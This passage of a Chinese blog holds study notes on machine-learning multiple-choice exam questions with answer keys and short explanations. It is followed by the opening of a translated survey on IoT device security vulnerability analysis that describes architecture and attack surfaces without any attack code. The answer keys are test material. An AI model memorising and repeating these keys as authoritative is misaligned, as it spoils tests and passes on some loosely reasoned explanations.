海明距离用于衡量两个等长字符串之间的不同位数，它不直接关注向量的方向。Jaccard距离用于衡量集合之间的相似性，它关注共同项的比例，而不考虑向量的方向。<br>
余弦距离衡量两个向量之间的夹角，而不考虑它们的大小。它主要关注向量的方向，因此更侧重于向量的方向性。通常用于衡量文本相似性、向量空间模型等场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">44. 解决隐马模型中预测问题的算法是（D）      </span><br><span class="line">A. 前向算法      </span><br><span class="line">B. 后向算法      </span><br><span class="line">C. Baum-Welch算法      </span><br><span class="line">D. 维特比算法      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">45. 梯度爆炸问题是指在训练深度神经网络的时候，梯度变得过大而损失函数变为无穷。在RNN中，下面哪种方法可以较好地处理梯度爆炸问题( A )      </span><br><span class="line">A. 梯度裁剪 B. 所有方法都不行      </span><br><span class="line">C. Dropout D. 加入正则项      </span><br></pre></td></tr></table></figure>
<p>梯度爆炸问题是指在训练过程中，梯度变得过大导致权重更新过大，损失函数变为无穷<br>
梯度裁剪通过设置一个梯度阈值，当梯度的L2范数超过这个阈值时，对梯度进行缩放，以防止梯度爆炸</p>
<p>Dropout是一种正则化技术；加入正则项是正则化的一种形式，通常用于控制模型的复杂度，减少过拟合。虽然它可以提高模型的泛化能力，但它的主要目的也不是直接处理梯度爆炸</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/20240110214627.png" alt="20240110214627"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">47.当不知道数据所带标签时，可以使用哪种技术促使带同类标签的数据与带其      </span><br><span class="line">他标签的数据相分离？(B)      </span><br><span class="line">A. 分类 B. 聚类 C. 关联分析 D. 隐马尔可夫链      </span><br></pre></td></tr></table></figure>
<p>前面讲过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48.现在需要计算三个稠密矩阵A,B,C的乘积ABC，假设三个矩阵的尺寸分别为m×n，n×p，p×q，且m &lt;n &lt;p &lt;q，不考虑矩阵乘法的优化时，以下计算顺序效率最高的是（A）      </span><br><span class="line">A. (AB)C      </span><br><span class="line">B. AC(B)      </span><br><span class="line">C. A(BC)      </span><br><span class="line">D. 效率都相同      </span><br></pre></td></tr></table></figure>
<p>中间结果的矩阵尺寸尽可能小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">49.下列方法中没有考虑先验分布的是( D )      </span><br><span class="line">A. 最大后验估计      </span><br><span class="line">B. 贝叶斯分类器      </span><br><span class="line">C. 贝叶斯学习      </span><br><span class="line">D. 最大似然估计      </span><br></pre></td></tr></table></figure>
<p>最大似然估计（MLE）基于观察到的数据来找到最可能产生这些数据的参数值，仅依赖于数据本身，不考虑参数的先验分布<br>
最大后验估计（MAP）： 考虑了先验分布，通过最大化后验概率来估计模型参数<br>
贝叶斯： 涉及到先验分布和后验概率的计算</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">50.下列哪一项主要负责在神经网络中引入非线性？（B）      </span><br><span class="line">A. 随机梯度下降      </span><br><span class="line">B. 修正线性单元（ReLU）      </span><br><span class="line">C. 输入的加权求和      </span><br><span class="line">D. 以上都不正确      </span><br></pre></td></tr></table></figure>
<p>上面说过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">51. 下列哪一种架构有反馈连接并常被用来处理序列数据？（A）      </span><br><span class="line">A. 循环神经网络      </span><br><span class="line">B. 卷积神经网络      </span><br><span class="line">C. 全连接网络      </span><br><span class="line">D. 都不是      </span><br></pre></td></tr></table></figure>
<p>循环神经网络的神经元之间的连接形成了循环，使得网络能够捕捉序列中的时间依赖关系，用来处理序列序列数据，如语言模型、时间序列分析<br>
卷积神经网络具有局部感知域和权重共享的特点，处理图像数据<br>
全连接网络即多层感知机，每一层中的神经元与前一层的所有神经元相连接，没有时间依赖关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">52. 在一个神经网络中，下面哪种方法可以用来处理过拟合？（D）      </span><br><span class="line">A. Dropout      </span><br><span class="line">B. 分批归一化(Batch Normalization)      </span><br><span class="line">C. 正则化(regularization)      </span><br><span class="line">D. 都可以      </span><br></pre></td></tr></table></figure>
<p>Dropout：正则化技术，在训练过程中随机地关闭一部分神经元，从而减少神经网络对特定神经元的依赖<br>
分批归一化：将每个输入特征在训练时归一化（将数据映射到一个标准范围或标准分布的过程），可以加速收敛、防止过拟合、允许较大学习率、对初始参数不敏感<br>
正则化：通过在损失函数中添加一个惩罚项，防止模型对训练数据过于敏感</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">53.某小区人脸识别准入系统用来识别待进入人员的身份，此系统一共包括识别3种不同的人员：业主，物业人员，未收录人员。下面哪种学习方法最适合此种应用需求：（B）。      </span><br><span class="line">A. 二分类      </span><br><span class="line">B. 多分类      </span><br><span class="line">C. 层次聚类      </span><br><span class="line">D. 线性回归      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">54.L1与L2范数在Logistic Regression 中,如果同时加入L1和L2范数,会产生什么效果( A )。      </span><br><span class="line">A. 可以做特征选择,并在一定程度上防止过拟合      </span><br><span class="line">B. 能解决维度灾难问题      </span><br><span class="line">C. 能加快计算速度      </span><br><span class="line">D. 能增加模型的拟合能力      </span><br></pre></td></tr></table></figure>
<p>L1和L2范数的加入主要是为了正则化和特征选择</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">55.下列模型中属于生成式模型的是（D）      </span><br><span class="line">A. 线性分类器      </span><br><span class="line">B. 卷积神经网络      </span><br><span class="line">C. 线性判别分析      </span><br><span class="line">D. 朴素贝叶斯模型      </span><br></pre></td></tr></table></figure>
<p>生成式模型是一类能够对数据的生成过程进行建模的模型。生成式模型通过学习类别的先验概率和类别条件概率来对样本进行建模<br>
线性分类器和卷积神经网络都是判别式模型<br>
线性判别分析要看具体使用方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">56.下列模型中属于判别式模型的是（A）      </span><br><span class="line">A. 支持向量机      </span><br><span class="line">B. 隐马尔可夫模型      </span><br><span class="line">C. 朴素贝叶斯模型      </span><br><span class="line">D. 高斯混合模型      </span><br></pre></td></tr></table></figure>
<p>判别式模型是一类直接对类别进行建模的统计模型。这类模型通过学习输入数据与其对应的类别之间的关系，直接对类别进行判别。判别式模型的目标是找到一个决策边界或者决策函数，将不同类别的样本分开。<br>
隐马尔科夫模型用于建模数据的生成过程<br>
高斯混合模型假设数据是由多个高斯分布混合而成的，提供了对数据的生成过程的完整描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">57.下列属于无监督学习的是（A）      </span><br><span class="line">A. k-means      </span><br><span class="line">B. SVM      </span><br><span class="line">C. 最大熵      </span><br><span class="line">D. CRF      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">58.关于“过拟合”现象的出现范围，下列说法哪个是正确的（C）      </span><br><span class="line">A. 只在监督学习中出现      </span><br><span class="line">B. 只在非监督学习中出现      </span><br><span class="line">C. 在监督学习和非监督学习中都可能出现      </span><br><span class="line">D. 在任何类型的学习中都不会出现      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">59.我们想在大数据集上训练决策树, 为了使用较少时间, 我们可以（C）      </span><br><span class="line">A. 增加树的深度      </span><br><span class="line">B. 增加学习率 (learning rate)      </span><br><span class="line">C. 减少树的深度      </span><br><span class="line">D. 减少树的数量      </span><br></pre></td></tr></table></figure>
<p>增加树的深度会导致更多的节点和分支，增加模型复杂度和训练时间、可能导致过拟合<br>
学习率通常用于控制梯度下降中步长的参数，决策树没有学习率参数可以调<br>
决策树只有一棵树, 不是随机森林</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">60.对于k折交叉验证, 以下对k的说法正确的是（D）      </span><br><span class="line">A. k越大, 不一定越好, 选择大的k会加大评估时间      </span><br><span class="line">B. 选择更大的k, 就会有更小的bias ，因为训练集更加接近总数据集      </span><br><span class="line">C. 在选择k时, 要最小化数据集之间的方差      </span><br><span class="line">D. 以上所有      </span><br></pre></td></tr></table></figure>
<p>在k折交叉验证中，将原始数据集分成k个子集，其中一个子集作为测试集，其余k-1个子集作为训练集。这个过程重复k次，每个子集都会轮流充当测试集。最终，将k次评估的结果取平均值，以得到对模型性能的综合评估。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">61.以下不属于贝叶斯分类器参数估计的准则的是（C）      </span><br><span class="line">A. 最大高斯后验      </span><br><span class="line">B. 最大beta后验      </span><br><span class="line">C. 最大间隔      </span><br><span class="line">D. 极大似然      </span><br></pre></td></tr></table></figure>
<p>记吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">62.下列选项中属于机器学习可解决的问题的有（D）      </span><br><span class="line">A. 分类      </span><br><span class="line">B. 聚类      </span><br><span class="line">C. 回归      </span><br><span class="line">D. 以上均可      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">63.下列选项中，关于KNN算法说法不正确的是（D）      </span><br><span class="line">A. 能找出与待测样本相近的K个样本      </span><br><span class="line">B. 可以使用欧氏距离度量相似度      </span><br><span class="line">C. 实现过程相对简单      </span><br><span class="line">D. 效率很高      </span><br></pre></td></tr></table></figure>
<p>每次预测都需要计算待测样本与所有训练样本之间的距离，效率在某些情况下可能较低，特别是在具有大量训练样本的情况下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">64.关于特征预处理，下列说法中错误的是（B ）      </span><br><span class="line">A. 包含标准化和归一化      </span><br><span class="line">B. 标准化在任何场景下受异常值的影响都很小      </span><br><span class="line">C. 归一化利用了样本中的最大值和最小值      </span><br><span class="line">D. 标准化实际上是将数据在样本的标准差上做了等比例的缩放操作      </span><br></pre></td></tr></table></figure>
<p>标准化对异常值敏感</p>
<p>标准化和归一化：用于数据预处理，标准化能够将数据转换为具有相同尺度的分布，使得算法对不同特征的权重更加平衡；归一化使得数据的范围在[0, 1]之间，有助于避免由于特征尺度差异导致的算法收敛慢或不稳定的问题<br>
标准化是通过减去均值并除以标准差的过程，使得数据的均值为0，标准差为1<br>
归一化是通过线性缩放将数据限定在某个范围内，通常是[0, 1]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">65. 关于交叉验证，下列说法中错误的是（A ）      </span><br><span class="line">A. 交叉验证能够直接提升模型的准确率      </span><br><span class="line">B. 交叉验证能够提供对模型泛化性能的更可靠估计      </span><br><span class="line">C. 交叉验证搭配网格搜索能够提升我们查找最优超参数组合的效率      </span><br><span class="line">D. 使用网格搜索时我们一般会提供超参数的可能取值字典      </span><br></pre></td></tr></table></figure>
<p>交叉验证是评估技术</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">66. 请选择下面可以应用隐马尔可夫（HMM）模型的选项：（D）      </span><br><span class="line">A. 基因序列数据集      </span><br><span class="line">B. 电影浏览数据集      </span><br><span class="line">C. 股票市场数据集      </span><br><span class="line">D. 所有以上      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">67.EM算法（Expectation Maximization Algorithm）是机器学习领域的一个经典算法，下面关于EM算法的说法中不正确的有：（A）      </span><br><span class="line">A. EM算法属于一种分类算法      </span><br><span class="line">B. EM算法可用于隐马尔科夫模型的参数估计      </span><br><span class="line">C. EM算法可以分为E-step和M-step两步      </span><br><span class="line">D. EM算法可用于从不完整的数据中计算最大似然估计      </span><br></pre></td></tr></table></figure>
<p>EM算法（期望最大）是一种迭代优化算法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">68.关于SVM的损失函数，下列说法中错误的是：（D）      </span><br><span class="line">A. SVM适用于多种损失函数      </span><br><span class="line">B. 0/1损失函数的最终结果只有两个，0代表分类正确，1代表分类错误      </span><br><span class="line">C. 合页损失(Hinge loss)衡量了被误分类的样本离分割超平面的距离的大小程度      </span><br><span class="line">D. 分类SVM常用平方误差损失来衡量模型的好坏      </span><br></pre></td></tr></table></figure>
<p>SVM通常使用合页损失</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">69.关于SVM核函数，下列说法中错误的是：（C）      </span><br><span class="line">A. 核函数的引入提升了SVM在线性不可分场景下的模型的稳健性      </span><br><span class="line">B. 核函数就是一类具有将某一类输入映射为某一类输出的函数      </span><br><span class="line">C. 核函数把特征映射到的空间维度越高越好      </span><br><span class="line">D. 常见的核函数有线性核、高斯核、多项式核、sigmoid核      </span><br></pre></td></tr></table></figure>
<p>高维特征空间的引入可以使得数据在更复杂的空间中变得线性可分，但过高的维度也可能导致维度灾难和计算复杂度的增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">70.下列关于Kmeans聚类算法的说法错误的是（D）      </span><br><span class="line">A. 对大数据集有较高的效率并且具有可伸缩性      </span><br><span class="line">B. 是一种无监督学习方法      </span><br><span class="line">C. 初始聚类中心随机选择      </span><br><span class="line">D. 初始聚类中心的选择对聚类结果影响不大      </span><br></pre></td></tr></table></figure>
<p>初始聚类中心的选择直接影响了算法收敛到的最终聚类结果。不同的初始聚类中心可能导致不同的局部最优解。通常采用随机选择多组初始聚类中心，运行算法多次，最终选择效果最好的一组聚类结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">71.关于朴素贝叶斯，下列说法错误的是：（D）      </span><br><span class="line">A. 它是一个分类算法      </span><br><span class="line">B. 朴素的意义在于它基于假设：所有特征之间是相互独立的      </span><br><span class="line">C. 它实际上是将多条件下的条件概率转换成了单一条件下的条件概率，简化了      </span><br><span class="line">计算      </span><br><span class="line">D. 以贝叶斯估计的角度来看朴素贝叶斯时，其没有估计联合概率      </span><br></pre></td></tr></table></figure>
<p>朴素贝叶斯通过联合概率和条件概率的关系计算后验概率，条件概率的估计是通过对训练数据中的频率进行统计，并采用贝叶斯估计的方法来平滑估计值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">72.避免直接的复杂非线性变换，采用线性手段实现非线性学习的方法是( A )      </span><br><span class="line">A. 核函数方法      </span><br><span class="line">B. 集成学习      </span><br><span class="line">C. 线性鉴别分析      </span><br><span class="line">D. PCA      </span><br></pre></td></tr></table></figure>
<p>核函数方法：在线性空间中进行非线性映射来处理非线性问题，即低维空间中进行高维特征空间的计算，避免了直接进行复杂的非线性变换<br>
按照GPT的输出结果，下面三个在某些情况也能应用在非线性问题…<br>
集成学习：组合多个弱学习器来构建一个模型，例如随机森林<br>
线性鉴别分析：线性的监督学习方法，在保持类别间距离最大化和类别内方差最小化的同时进行降维，不直接用于实现非线性学习<br>
主成分分析：降维方法，同样不直接用于实现非线性学习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">73.下列选项中，关于逻辑斯蒂回归的说法不正确是：（B）      </span><br><span class="line">A. 逻辑斯蒂回归是监督学习      </span><br><span class="line">B. 逻辑斯蒂回归是一个回归模型      </span><br><span class="line">C. 逻辑斯蒂回归是一个分类模型      </span><br><span class="line">D. 逻辑斯蒂回归使用sigmoid函数作为激活函数对回归的结果做了映射      </span><br></pre></td></tr></table></figure>
<p>逻辑斯蒂回归是用于解决二分类问题的分类模型。使用sigmoid函数（逻辑斯蒂函数）将线性组合的输入映射到[0,1]范围内，正负类别按0.5区分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">74.下列关于样本类别不均衡场景的描述正确的是（A）      </span><br><span class="line">A. 样本类别不均衡会影响分类模型的最终结果      </span><br><span class="line">B. 样本类别不均衡场景下我们没有可行的解决办法      </span><br><span class="line">C. 欠采样是复制类别数较少的样本来进行样本集的扩充      </span><br><span class="line">D. 过采样会造成数据集部分信息的流失      </span><br></pre></td></tr></table></figure>
<p>样本类别不均衡场景：可以过采样、欠采样、使用不同的评估指标以及使用专门设计用于处理不均衡数据的算法<br>
欠采样：减少类别较多的样本<br>
过采样：补充类别较少的样本（复制、生成新样本：随机插值、引入噪声等）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">75.下列关于无监督学习描述错误的是（C）      </span><br><span class="line">A. 无标签信息      </span><br><span class="line">B. 聚类是其中一个应用      </span><br><span class="line">C. 不能使用降维      </span><br><span class="line">D. 在现实生活中有广泛的应用      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">76.将一个k分类问题分解成一对一分类问题时总共需要（A）个分类器      </span><br><span class="line">A. k(k-1)/2      </span><br><span class="line">B. k(k-1)      </span><br><span class="line">C. k      </span><br><span class="line">D. k!      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">77.下列关于聚类说法错误的是（D）      </span><br><span class="line">A. 无需样本有标签      </span><br><span class="line">B. 可用于抽取一些特征      </span><br><span class="line">C. 可提取关于数据的结构信息      </span><br><span class="line">D. 同一个类内的样本之间差异较大      </span><br></pre></td></tr></table></figure>
<p>没啥好说的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">78.下列关于k-means说法不正确的是（ D ）      </span><br><span class="line">A. 算法有可能终止于局部最优解      </span><br><span class="line">B. 簇的数目需要事先给定      </span><br><span class="line">C. 对噪声和离群点敏感      </span><br><span class="line">D. 适合处理非凸型数据      </span><br></pre></td></tr></table></figure>
<p>k-means算法假定数据是凸形的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">79.在有限支撑集上，下面分布中熵最大的是( D )      </span><br><span class="line">A. 几何分布      </span><br><span class="line">B. 指数分布      </span><br><span class="line">C．高斯分布      </span><br><span class="line">D. 均匀分布      </span><br></pre></td></tr></table></figure>
<p>支撑集是指一个随机变量可能取值的集合。如果支撑集是有限的，意味着随机变量只能在一个有限的范围内取值<br>
随机变量约不确定熵越大，<br>
均匀分布的每个样本点都具有相同的概率，当每个可能的事件发生的概率相等时，熵取得最大值。在均匀分布的情况下，我们无法通过观察一些事件来更好地预测其他事件的发生，因此整个系统的不确定性最大，熵也就最大。<br>
几何分布的支撑集是整个正整数集合<br>
指数分布的支撑集是非负实数轴<br>
高斯分布，即正态分布，是连续概率分布，其支撑集是整个实数轴</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">80.给定均值和方差的情况下，下面分布中熵最大的是（C）      </span><br><span class="line">A. 几何分布      </span><br><span class="line">B. 指数分布      </span><br><span class="line">C．高斯分布      </span><br><span class="line">D. 均匀分布      </span><br></pre></td></tr></table></figure>
<p>几何分布：几何分布的熵由成功概率（或失败概率）决定<br>
高斯分布在所有具有相同均值和方差的分布中，熵是最大的，表示它是最不确定的分布；均匀分布在特定情况下可能具有最大熵，但一般情况下，高斯分布的熵更大。</p>
]]></content>
  </entry>
  <entry>
    <title>【翻译】A Survey of Security Vulnerability Analysis,Discovery, Detection, and Mitigation on IoT Devices</title>
    <url>/62497.html</url>
    <content><![CDATA[<p>在前面：<br>
完整阅读完的第一篇论文。这篇出自2019年MDPI的Future Internet，虽然最近两年出了更新的成果和趋势，但也本文也没有太过时，算是讲全了IoT研究的发展和角度。<br>
翻译和自己阅读还是挺不一样的，发现了自己语文水平蒟蒻，连啥时候用逗号都把握不住… DeepL 和 Google Translate 还是各有千秋。</p>
<blockquote>
<p>文章由本人首发于安全客：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQ0NzEx">IoT设备安全漏洞分析、挖掘、检测和缓解综述 - 安全客，安全资讯平台 (anquanke.com)<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<span id="more"></span>
<h1>IoT设备安全漏洞分析、挖掘、检测和缓解综述</h1>
<p>来源：<span class="exturl" data-url="aHR0cDovL25ldHNlYy5jY2VydC5lZHUuY24vY2hzL3B1YmxpY2F0aW9ucy9mdXR1cmVpbnRlcm5ldDIwLWlvdA==">http://netsec.ccert.edu.cn/chs/publications/futureinternet20-iot<i class="fa fa-external-link-alt"></i></span></p>
<!-- vscode-markdown-toc -->
<ul>
<li>
<ol>
<li><a href="#">摘要</a></li>
</ol>
</li>
<li>
<ol start="2">
<li><a href="#-1">介绍</a></li>
</ol>
</li>
<li>
<ol start="3">
<li><a href="#-1">背景</a></li>
</ol>
<ul>
<li>3.1.<a href="#IoT">IoT架构</a></li>
<li>3.2.<a href="#-1">设备构成</a></li>
<li>3.3.<a href="#-1">攻击面</a>
<ul>
<li>3.3.1.<a href="#-1">硬件层</a></li>
<li>3.3.2.<a href="#-1">软件层</a></li>
<li>3.3.3.<a href="#-1">协议接口层</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="4">
<li><a href="#-1">漏洞分析、挖掘、检测和缓解</a></li>
</ol>
<ul>
<li>4.1.<a href="#-1">漏洞分析的基础框架研究</a></li>
<li>4.2.<a href="#-1">漏洞挖掘技术研究</a>
<ul>
<li>4.2.1.<a href="#-1">动态分析方法</a></li>
<li>4.2.2.<a href="#-1">静态分析方法</a></li>
</ul>
</li>
<li>4.3.<a href="#-1">漏洞检测研究</a>
<ul>
<li>4.3.1.<a href="#-1">网络扫描</a></li>
</ul>
</li>
<li>4.4.<a href="#-1">相似性检测</a>
<ul>
<li>4.4.1.<a href="#-1">源代码相似性检测</a></li>
<li>4.4.2.<a href="#-1">二进制代码相似性检测</a></li>
</ul>
</li>
<li>4.5.<a href="#-1">漏洞缓解研究</a>
<ul>
<li>4.5.1.<a href="#-1">自动化生成补丁</a></li>
<li>4.5.2.<a href="#-1">访问控制</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="5">
<li><a href="#-1">讨论</a></li>
</ol>
<ul>
<li>5.1.<a href="#-1">评估</a></li>
<li>5.2.<a href="#-1">难点</a>
<ul>
<li>5.2.1.<a href="#1ComplexityandHeterogeneityofDevice">（1）设备的复杂性和异构性（Complexity and Heterogeneity of Device）</a></li>
<li>5.2.2.<a href="#2Limitationsofdeviceresources">（2）设备资源的限制（Limitations of device resources）</a></li>
<li>5.2.3.<a href="#3Closed-SourceMeasures">（3）闭源措施（Closed-Source Measures）</a></li>
</ul>
</li>
<li>5.3.<a href="#-1">机会</a>
<ul>
<li>5.3.1.<a href="#1AI">（1）AI技术的应用</a></li>
<li>5.3.2.<a href="#2">（2）对第三方和开源代码的依赖</a></li>
<li>5.3.3.<a href="#3">（3）外围设备系统的开发</a></li>
</ul>
</li>
</ul>
</li>
<li>
<ol start="6">
<li><a href="#-1">研究方向</a></li>
</ol>
</li>
<li>
<ol start="7">
<li><a href="#-1">结论</a></li>
</ol>
</li>
</ul>
<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->
<!--more-->
<h2 id="1-a-name-a-摘要">1. <code>&lt;a name=''&gt;&lt;/a&gt;</code>摘要</h2>
<p>随着IoT产业的兴盛，多种多样的IoT设备开始迅速发展，智能家居、智能穿戴、智能制造、智能汽车等一系列和生活相关的领域得到大量使用。随之而来的是层出不穷的IoT设备上的漏洞。安全问题的增加会对用户的隐私和财产带来严重威胁。本文首先介绍了研究背景，包括IoT架构、设备构成和攻击面。我们回顾了有关IoT设备漏洞挖掘、检测、缓解技术最前沿的研究，随后通过评估指出了现在面临的困难和机会，最后预测和讨论了IoT设备上漏洞分析技术的研究方向。</p>
<h2 id="2-a-name-1-a-介绍">2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>介绍</h2>
<p>IoT正在成为最广泛和实用的在线平台。它将大量的传感器和控制器联网，帮助人们实现和万物之间的无缝通信。IoT正在成为互联网未来的关键，特别是近几年，随着IoT产业的兴盛，多种多样的IoT设备开始迅速发展，全球活跃的IoT设备已经达到70亿[^1]，它们在智能家居、智能穿戴、智能制造、智能汽车等一系列和生活相关的领域广泛使用，我们认为这会极大提升我们的生活质量。同时，IoT设备的安全问题经常发生，也难以解决。惠普的报告表明70%的IoT设备包含安全漏洞，平均每台设备有25个漏洞[^2]。攻击者利用这些漏洞控制设备，进行一系列非法的活动。最著名的例子是在2016年Mirai病毒控制了成百上千台IoT设备，用这些设备建造了一个僵尸网络发动TB级的dos攻击，攻击目标包括DNS服务提供商Dyn，这次攻击造成了严重的后果，包括导致美国部分的网络瘫痪[^3]。总的来说，随着IoT设备的广泛使用、安全漏洞的增加会对用户的隐私和安全，甚至人类的生活和财产带来严重威胁。面对频繁的攻击，IoT安全研究变得越来越流行。在美国Auto-ID于1999年第一次提出“物联网”的概念[^4]后，安全研究者们投身于IoT行业，研究安全架构和通信的标准[^5,^6]。随后产生了许多关于IoT安全的问题[^7-^12]。Zhang等人[^13]、Mahmoud等人[^14]指出了面临的问题和研究方向，于是，研究者开始在IoT安全领域使用传统安全研究的方法[^15]。随着AI的发展，将机器学习和深度学习应用于IoT安全上的概念开始产生[^16]。Alrawi等人[^17]，系统的总结了智能家居中设备、手机应用、云端和通信的IoT攻击点。Xie等人[^18]总结及了检测IoT漏洞的技术。最近，Zheng等人[^19]发表了IoT漏洞挖掘的技术概论。在上述的两篇论文中，漏洞挖掘和漏洞检测的界限较为模糊。在本文中，漏洞挖掘的技术即挖掘未知的漏洞，漏洞检测指针对已知漏洞的检测。通过以上调查，我们发现现有的研究关注于IoT安全问题，缺少分析技术，其次，漏洞分析技术的重点在漏洞挖掘和检测，缺少漏洞缓解技术，综上，现有的IoT安全的技术总结还不够全面。为了解决前面提到的问题，我们希望对以下个方面做出一些贡献：</p>
<ul>
<li>首先，我们把重点从IoT架构转移到IoT设备；其次，精简IoT设备安全技术的分类；另外我们总结了现有的研究，包括漏洞分析的基础框架、挖掘未知的漏洞、检测已知的漏洞、漏洞缓解</li>
<li>我们评估了现有的关于IoT设备漏洞分析的研究。除此之外，我们深入分析了阻碍安全研究技术发展的原因，指出了面临的困难和机会</li>
<li>我们回顾了技术发展的背景，并为相关研究者提出了未来研究的方向</li>
</ul>
<p>这篇论文的结构如下：第二节描述了IoT安全的背景，介绍了IoT设备的架构、设备构成和攻击面；第三节回顾了已有的IoT设备安全研究，包括漏洞分析、挖掘、检测和缓解；第四节基于对漏洞分析技术的评估，总结了目前遇到的问题和机会；第五节提出了未来研究的热点方向；第六节对论文进行了总结</p>
<h2 id="3-a-name-1-a-背景">3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>背景</h2>
<h3 id="3-1-a-name-IoT-a-IoT架构">3.1. <code>&lt;a name='IoT'&gt;&lt;/a&gt;</code>IoT架构</h3>
<p>随着网络的快速发展，越来越多的家用和工业设备开始联网，给我们带来了多元化的生活。物联网架构主要有两个发展方向：消费者层面和产业层面<br>
在消费者层面，如果我们将它们按照应用场景划分，有几类设备类型例如工业制造、智能家居、智能医疗和智能汽车，其中智能家居的发展相对成熟。互联网巨头——三星、谷歌、苹果和小米占据大部分市场份额，同时，它们也发布了SmartThings[^20]、Google Weave[^21]、Apple HomeKit[^22]、HomeAssistant[^23] 和 XiaoMi IoT[^24]等物联网平台。通过调查这些平台，我们发现绝大多数IoT遵循“设备&lt;-&gt;云端&lt;-&gt;用户”这一架构（如图1）。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210613122500.png" alt="20210613122500"><br>
智能设备大部分都放在家中，它们和云服务器进行通信，然后直接或间接通过WiFi[^25]、ZigBee[^26]、蓝牙[^27]或其他协议接入网络。它们上传传感器收集的数据，接收发送给执行单元的控制命令。IoT架构不仅依赖供应商的云，同时也依赖第三方的云，它们相互支持，并为各种功能提供多样化的服务。用户可以通过手机或者电脑连接云查看状态并下载数据。对于一些简单场景例如可穿戴设备，“设备&lt;-&gt;用户”架构更加实用。</p>
<p>对于产业层面，IoT架构延续了IT的做法，通过服务器集中管理用户和设备的交互（如图2），区别是设备首先通过OT和PLC进行通信。因此产业中的设备等同于PLC和“传感器+执行器”。安全研究的重点在于PLC。“设备&lt;-&gt;用户”架构也存在于产业物联网：管理员用配置软件控制设备。虽然面向用户的工业终端例如智能仪表也尝试了云的模式，但基于安全考虑没有得到广泛使用<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210617205408.png" alt="20210617205408"></p>
<h3 id="3-2-a-name-1-a-设备构成">3.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>设备构成</h3>
<p>不论是汽车制造中大而复杂的机器，亦或穿戴设备里小巧智能的手环，它们都包含了相对固定的零件例如芯片、闪存、固件等。它们主要包含硬件和软件部分</p>
<ol>
<li>硬件</li>
</ol>
<ul>
<li>逻辑芯片：对于复杂的设备来说，它们需要多个逻辑芯片或cpu来运行内置的操作系统；对于简单的嵌入式设备或许只需要一个微处理器来运行程序</li>
<li>内存：为系统和程序运行提供空间，大小从KB到GB不等</li>
<li>闪存：储存IoT设备固件。部分设备的bootloader也存放在闪存</li>
<li>网络模块。IoT设备和传统嵌入式设备的区别就是前者连接了网络。他们通常采用无线技术连接到互联网，如AP</li>
<li>串行调试接口：IoT设备需要与外部进行通信，以便调试。串行调试接口可以让开发人员发送和接收命令。最常见的接口是通用异步接收器/发送器UART</li>
</ul>
<ol start="2">
<li>软件</li>
</ol>
<ul>
<li>Bootloader：在IoT设备系统启动前，它初始化了硬件设备，将固件加载到引导设备。它使系统的软件和硬件环境达到合适的状态</li>
<li>固件：固件包括了操作系统、文件系统和一系列服务程序。IoT设备上的安全研究通常从固件分析开始</li>
</ul>
